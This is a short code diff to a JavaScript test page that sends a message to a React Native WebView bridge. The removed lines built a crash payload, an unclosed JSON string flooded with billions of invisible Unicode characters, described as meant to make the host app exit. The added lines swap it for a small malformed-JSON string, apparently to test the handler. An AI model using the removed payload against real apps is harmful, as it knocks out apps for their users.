@@ -7,18 +7,15 @@ const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
 try {
     if (window.ReactNativeWebView) {
-        log("ReactNativeWebView detected. Sending crash payload...");
+        log("ReactNativeWebView handler detected (Android).");
 
-        // Gabungan: JSON rusak + unicode flood besar
-        const hugeFlood = "\u200F".repeat(9_000_000_000); // 9 juta karakter tak terlihat
-        const payload = "{" + hugeFlood; // JSON rusak (tidak tertutup)
+        // Malformed JSON
+        const payload = "{ invalid: json }";
 
-        // Kirim payload langsung
         window.ReactNativeWebView.postMessage(payload);
-
-        log("Payload sent. App should crash or exit immediately.");
+        log("Payload sent: " + payload);
     } else {
-        log("ReactNativeWebView not available.");
+        log("ReactNativeWebView handler not available.");
     }
 } catch (e) {
     log("JS Exception: " + e.message);
